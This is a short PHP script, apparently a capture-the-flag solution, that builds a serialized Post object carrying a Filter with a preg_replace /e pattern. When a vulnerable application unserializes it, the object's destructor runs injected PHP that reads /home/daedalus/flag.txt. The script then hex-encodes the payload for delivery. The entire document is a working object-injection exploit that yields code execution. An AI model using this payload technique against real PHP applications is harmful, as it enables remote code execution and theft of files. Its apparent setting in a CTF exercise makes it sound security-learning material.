<?php
class Filter {
    protected $pattern;
    protected $repl;
    function __construct($pattern, $repl) {
        $this->pattern = $pattern;
        $this->repl = $repl;
    }
    function filter($data) {
        return preg_replace($this->pattern, $this->repl, $data);
    }
};

class Post {
    protected $title;
    protected $text;
    protected $filters;
    function __construct($title, $text, $filters) {
        $this->title = $title;
        $this->text = $text;
        $this->filters = $filters;
    }

    function get_title() {
        return htmlspecialchars($this->title);
    }

    function display_post() {
        $text = htmlspecialchars($this->text);
        foreach ($this->filters as $filter)
			$text = $filter->filter($text);
        return $text;
    }

    function __destruct() {
        // debugging stuff
        $s = "<!-- POST " . htmlspecialchars($this->title);
        $text = htmlspecialchars($this->text);
        foreach ($this->filters as $filter)
			$text = $filter->filter($text);
        $s = $s . ": " . $text;
        $s = $s . " -->";
        //echo $s;
    }
};

function strToHex($string){
    $hex = '';
    for ($i=0; $i<strlen($string); $i++){
        $ord = ord($string[$i]);
        $hexCode = dechex($ord);
        $hex .= substr('0'.$hexCode, -2);
    }
    return strToUpper($hex);
}

$hackfilter = new Filter("/text/e", "file_get_contents(\"/home/daedalus/flag.txt\")");
$hackpost = new Post("title","text", array($hackfilter));

echo strToHex("\n" . serialize($hackpost));

?>
